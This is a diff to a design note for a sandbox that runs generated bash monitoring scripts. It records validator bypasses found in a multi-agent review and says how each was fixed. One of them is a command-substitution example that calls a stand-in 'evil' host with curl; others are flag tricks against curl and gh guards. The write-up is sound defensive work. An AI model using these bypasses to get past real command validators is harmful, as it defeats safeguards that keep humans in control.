@@ -31,11 +31,36 @@ foundation) · Linear MDS-52 (epic), MDS-53.
 > script they protect. The §3.3 TOCTOU check and §3.4 envelope check read from
 > this sidecar (still "trusted state", just a dedicated file).
 
-> **[impl] Adversarial review unavailable.** Both codex (#479, 401 fleet-wide)
-> and aichat (no gateway configured) were down, so there was **no automated
-> red-team pass** on the security surface. Compensated with thorough validator /
-> sandbox / TOCTOU / breaker / notify unit tests (121 cases) + careful manual
-> self-review; flagged in the PR body.
+> **[impl] Adversarial review unavailable → multi-agent review instead.** Both
+> codex (#479, 401 fleet-wide) and aichat (no gateway configured) were down, so
+> there was no automated red-team CLI. Compensated with thorough validator /
+> sandbox / TOCTOU / breaker / notify unit tests + a multi-agent review pass that
+> found and drove fixes for several real validator bypasses, all now closed +
+> regression-tested:
+> - **bash `python3 -c '…'`** was an arbitrary-code escape → **python3 removed
+>   entirely** (only bash is accepted; bash+jq covers the read-only need, and a
+>   sound python sandbox needs more than an AST denylist).
+> - **command substitution inside double quotes** (`echo "$(curl evil)"`) was not
+>   scanned → the operator scanner now runs inside double quotes too (single
+>   quotes remain the only literal context).
+> - **`venn --confirm=true`**, **`gh api --method=POST` / `-XPOST` / `-f` field
+>   auto-POST**, **`curl -o/-O/-K`** (file write / config include) all bypassed
+>   their guards → each tightened.
+> - **TOCTOU verify→exec**: the sandbox now executes the exact verified bytes
+>   (content is read+verified once, then run from a private scratch copy) instead
+>   of re-opening a path that could be swapped/symlinked between check and exec.
+> - **breaker** no longer throttles the $0 cached fast path (only regen), resets
+>   on any successful detection, and the state sidecar is written atomically.
+>
+> The static bash validator remains heuristic by nature (§3.2) — the sandbox is
+> the boundary that contains a miss. A **human adversarial pass on the validator +
+> sandbox before merge is still strongly recommended** given the new unattended
+> codegen trust surface.
+>
+> **Known residual:** the trusted-state sidecar has no cross-process lock, so a
+> human running `monitors approve-script`/`recache` at the exact instant the
+> scheduler is mid-tick on the same monitor can lose one write; it is
+> self-correcting (a hash mismatch just triggers one regen) and low-severity.
 
 ---
 
